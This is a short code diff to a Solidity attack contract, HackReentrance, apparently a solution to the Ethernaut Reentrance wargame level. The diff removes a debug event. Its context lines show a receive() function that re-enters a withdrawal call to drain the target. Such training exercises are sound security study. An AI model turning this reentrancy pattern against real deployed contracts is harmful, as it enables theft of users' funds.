@@ -6,7 +6,6 @@ import "../ethernaut/Reentrance.sol";
 contract HackReentrance {
 
     Reentrance private _reentrance;
-    event FuncitonReentered(uint256 times);
     
     constructor(address payable reentranceAddress) public {
         _reentrance = Reentrance(reentranceAddress);
@@ -29,7 +28,6 @@ contract HackReentrance {
     }
 
     receive() external payable {
-        emit FuncitonReentered(1);
         _withdrawBalance();   
     }
     
